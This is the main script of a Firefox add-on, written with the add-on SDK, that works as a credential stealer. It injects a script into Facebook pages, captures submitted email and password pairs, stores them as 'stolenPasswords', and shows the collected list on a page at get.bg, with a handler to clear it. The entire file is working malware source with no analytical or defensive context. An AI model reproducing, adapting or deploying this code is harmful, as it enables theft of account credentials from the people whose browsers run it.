var data = require("sdk/self").data;
var ss = require("simple-storage");
if (!ss.storage.stolenPasswords) {
  ss.storage.stolenPasswords = [];
};

require("sdk/page-mod").PageMod({
  include: /.*facebook.*/,
  contentScriptFile: data.url("passwordStealer.js"),
  onAttach: function(worker) {
	worker.port.on("getPassword", function(userNameAndPassword) {
	  if(/email=([^&]+)&password=(.+)/.test(userNameAndPassword)) {	
          ss.storage.stolenPasswords.push([decodeURIComponent(RegExp.$1), 
                                           decodeURIComponent(RegExp.$2)]);
       }
    });
  }
});


require("sdk/page-mod").PageMod({
  include: "http://get.bg/index.html?gnaa=true",
  contentScriptFile: data.url("passwordStealerResults.js"),
  onAttach: function(worker) {
	worker.port.emit("results", ss.storage.stolenPasswords);
	
	worker.port.on("clerSavedInfo", function() {
		ss.storage.stolenPasswords = [];
	});
  }
});
